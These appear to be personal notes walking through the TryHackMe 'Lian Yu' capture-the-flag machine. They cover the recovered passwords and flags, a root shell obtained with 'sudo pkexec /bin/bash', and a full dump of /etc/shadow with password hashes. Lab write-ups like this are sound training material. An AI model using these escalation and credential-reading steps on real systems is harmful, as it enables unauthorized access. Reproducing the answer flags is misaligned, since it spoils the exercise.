@@ -1,0 +1,128 @@
+https://medium.com/bugbountywriteup/lian-yu-try-hack-me-walkthrough-ce8783c21bb2
+
+
+						
+
+						Gob: 
+
+/island
+
+codeword - vigilante
+
+/island/2100
+
+you can avail your .ticket here but how?
+
+/island/2100/green_arrow.ticket
+
+RTy8yhBQdscX
+
+
+
+
+https://gchq.github.io/CyberChef/   : 
+
+input - RTy8yhBQdscX
+
+*from base 58
+
+output - !#th3h00d
+
+
+						
+
+						ftp:
+
+aa.jpg   Leave_me_alone.png  "Queen's_Gambit.png"   
+
+*found users vigilante and slade in /home
+
+
+
+						
+
+						steg:
+
+ss.zip 
+
+- passwd.txt
+
+- shado   
+
+*found ssh password M3tahuman
+
+
+						
+
+						ssh:
+
+user.txt - THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+			--Felicity Smoak
+
+
+						
+
+						privesc:
+
+slade@LianYu:~$ sudo -l
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+slade@LianYu:~$ sudo /usr/bin/pkexec /bin/bash 
+root@LianYu:~#
+
+root.txt -                           Mission accomplished
+
+
+
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
+
+
+
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+									      --DEATHSTROKE
+
+Let me know your comments about this machine :)
+I will be available @twitter @User6825
+
+
+						
+
+						SHADOW FILE:
+
+root@LianYu:~# cat /etc/shadow
+root:$6$MDqefYk3$73p6WJHYUPRZkOB6RCenoecSLzwhH/VtwwLjqf8hG.aor8bjI8K8E57Q5r87jkB/BOPFqM/GSjooTQ2VzVr4B.:18383:0:99999:7:::
+daemon:*:16550:0:99999:7:::
+bin:*:16550:0:99999:7:::
+sys:*:16550:0:99999:7:::
+sync:*:16550:0:99999:7:::
+games:*:16550:0:99999:7:::
+man:*:16550:0:99999:7:::
+lp:*:16550:0:99999:7:::
+mail:*:16550:0:99999:7:::
+news:*:16550:0:99999:7:::
+uucp:*:16550:0:99999:7:::
+proxy:*:16550:0:99999:7:::
+www-data:*:16550:0:99999:7:::
+backup:*:16550:0:99999:7:::
+list:*:16550:0:99999:7:::
+irc:*:16550:0:99999:7:::
+gnats:*:16550:0:99999:7:::
+nobody:*:16550:0:99999:7:::
+systemd-timesync:*:16550:0:99999:7:::
+systemd-network:*:16550:0:99999:7:::
+systemd-resolve:*:16550:0:99999:7:::
+systemd-bus-proxy:*:16550:0:99999:7:::
+uuidd:*:16550:0:99999:7:::
+Debian-exim:!:16550:0:99999:7:::
+messagebus:*:16550:0:99999:7:::
+statd:*:16550:0:99999:7:::
+avahi-autoipd:*:16550:0:99999:7:::
+slade:$6$zXsnAJNl$.q70x6HUsQrrY4k/Hzyk4XWpiYctAoLUHldhcruSmiOth4LRPYZhr20krZGKOZcZGl7BUq.q3PBVqHWddg3k2.:18383:0:99999:7:::
+sshd:*:18383:0:99999:7:::
+ftp:*:18383:0:99999:7:::
+vigilante:$6$n43ML1fF$vlPEGQ3O4bSz8fVkjmKxwkQDJ1wMvMVqw8SEZSHVZ2L/h2N5XXfUpcMYQzOW8n1olZRQXO8sp7.O14w/Ao67v.:18383:0:99999:7:::
+root@LianYu:~# 
